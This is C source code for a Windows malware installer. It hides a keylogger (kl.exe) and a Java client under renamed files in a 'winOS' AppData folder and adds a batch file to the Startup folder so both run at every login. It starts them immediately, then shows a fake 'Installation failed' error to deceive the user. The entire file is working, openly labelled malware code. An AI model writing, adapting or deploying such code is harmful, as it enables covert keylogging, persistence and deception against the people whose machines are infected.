#include <stdio.h>
#include <stdlib.h>
#include <Shlobj.h>
#include <unistd.h>
#include <errno.h>
#include <windows.h>

/* Define file and folder names */
#define JAR_FILENAME_OLD "client.jar"
#define JAR_FILENAME_NEW "winOShandle.jar"
#define KL_FILENAME_OLD "kl.exe"
#define KL_FILENAME_NEW "kl.exe"
#define BAT_FILENAME "winOShandle.bat"
#define VIRUS_DIR "winOS" /* change in kl too ! */

int main() {

    /* Create strings to store paths */
    char appdata_path[MAX_PATH];
    char virus_dir_path[MAX_PATH];
    char autostart_dir[MAX_PATH];
    char bat_path[MAX_PATH];
    char jar_path[MAX_PATH];
    char kl_path[MAX_PATH];

    /* Create string to store copy commands */
    char cmd_cpy[MAX_PATH + 50];

    /* Create string for error messages */
    char err_msg[150];

    /* Pointer to bat-file */
    FILE *bat;


    /* Close console window */
    FreeConsole();


    /* Check if files are readable */
    if (access(JAR_FILENAME_OLD, R_OK) || access(KL_FILENAME_OLD, R_OK)) {
        sprintf(err_msg,
             "File %s not found in this directory\nFile %s not found in this directory",
              JAR_FILENAME_OLD, KL_FILENAME_OLD);
        MessageBox(NULL, err_msg, "FNF", MB_ICONERROR);
        return -1;
    }


    /* get path to appdata-folder and store in appdata_path */
    if (SHGetFolderPath(NULL, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, 0, appdata_path) != S_OK) {
            MessageBox(NULL, "Directory not accessible", "ERR_DNA", MB_ICONERROR);
            return -1;
        }


    /* Store paths to target directory and files */
    sprintf(virus_dir_path, "%s\\%s", appdata_path, VIRUS_DIR);
    sprintf(jar_path, "%s\\%s", virus_dir_path, JAR_FILENAME_NEW);
    sprintf(kl_path, "%s\\%s", virus_dir_path, KL_FILENAME_NEW);
    sprintf(autostart_dir, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", appdata_path);
    sprintf(bat_path, "%s\\%s", autostart_dir, BAT_FILENAME);


    /* Create dir if not already existing */
    if (mkdir(virus_dir_path) != 0 && errno != EEXIST) {
        MessageBox(NULL, "Directory not accessible", "ERR_DNA", MB_ICONERROR);
        return 1;
    }


    /* Create command to copy jar-file and execute it */
    if (access(jar_path, F_OK)) {
        sprintf(cmd_cpy, "copy %s %s", JAR_FILENAME_OLD, jar_path);
        system(cmd_cpy);
    }


    /* Create command to copy kl-file and execute it */
    if (access(kl_path, F_OK)) {
        sprintf(cmd_cpy, "copy %s %s", KL_FILENAME_OLD, kl_path);
        system(cmd_cpy);
    }


    /* Create and write to bat-file */
    if (access(bat_path, F_OK)) {
        bat = fopen(bat_path, "w");
        if (bat == NULL) {
            MessageBox(NULL, "Program unable to start", "ERR_NS", MB_ICONERROR);
            return 1;
        }
        fprintf(bat, "@echo off\ncd \"%s\\%s\"\nstart \"\" /B \"%s\"\nstart \"\" /B \"javaw\" -Xmx200m -jar %s\nexit", appdata_path, VIRUS_DIR, KL_FILENAME_NEW, jar_path);
        fclose(bat);

        /* execute bat-file */
        chdir(autostart_dir);
        system(BAT_FILENAME);
    }


    // Check if installation was succsessful
    if (access(jar_path, X_OK) || access(kl_path, X_OK) || access(bat_path, X_OK)) {
        MessageBox(NULL, "Installed files not accessible\nPlease try again", "ERR_RUN", MB_ICONERROR);
        return -1;
    }


    /* Fake error */
    MessageBox(NULL, "Installation failed\nPortable dependencies not found", "ERR_UKWN", MB_ICONERROR);


    /* SUCCESS */
    return 0;
}
